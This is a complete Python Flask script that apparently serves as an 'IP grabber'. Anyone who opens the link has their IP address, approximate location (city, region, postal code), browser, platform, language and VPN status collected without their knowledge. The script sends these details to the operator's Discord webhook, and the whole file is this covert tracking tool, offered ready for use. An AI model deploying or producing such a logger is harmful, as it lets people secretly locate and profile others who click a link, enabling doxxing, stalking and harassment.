from flask import Flask, request, redirect,request
from dhooks import Webhook, Embed
import requests,json
from os import system
from urllib.request import urlopen
try:
  from werkzeug.useragents import UserAgent
except:
  system("pip install werkzeug==2.0")
hook = Webhook("YOUR WEBHOOK HERE")
app = Flask(__name__)
@app.route('/', methods = ['POST', 'GET'])
def grabbing():
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    publicip = request.environ['REMOTE_ADDR']
  else:
    publicip = request.environ['HTTP_X_FORWARDED_FOR']
  url = f'https://ipinfo.io/{publicip}/json'
  response = urlopen(url)
  data = json.load(response)

  region=data['region']
  city=data['city']
  country=data['country']
  postal=data['postal']
  useragent = request.user_agent.string
  supported_languages = ["en", "nl", "it", 'de', 'ru', 'cn','in','hk']
  lang = request.accept_languages.best_match(supported_languages)
  user_agent = UserAgent(request.headers.get('User-Agent'))
  platform = user_agent.platform
  browser = request.user_agent.browser
  r = requests.get(f"https://api.xdefcon.com/proxy/check/?ip={publicip}").text
  if 'proxy": true,' in r:
    proxy=True
  else:
    proxy=False
  embed = Embed(
    color=0x5CDBF0,
    timestamp='now'  # sets the timestamp to current time
    )
  embed.set_author(name='Ip logger made by https://github.com/baum1810')
  embed.add_field(name='Ip', value=publicip)
  embed.add_field(name='County', value=country)
  embed.add_field(name='Region', value=region)
  embed.add_field(name='City', value=city)
  embed.add_field(name='Postal', value=postal)
  embed.add_field(name='Useragent', value=useragent)
  embed.add_field(name='Browser Language', value=lang)
  embed.add_field(name='Platform', value=platform)
  embed.add_field(name='Browser', value=browser)
  embed.add_field(name='Proxy/Vpn', value=proxy)
  hook.send(embed=embed)
  return "Ip grabber by https://github.com/baum1810"
  
app.run(debug=False,host='0.0.0.0', port=8000)
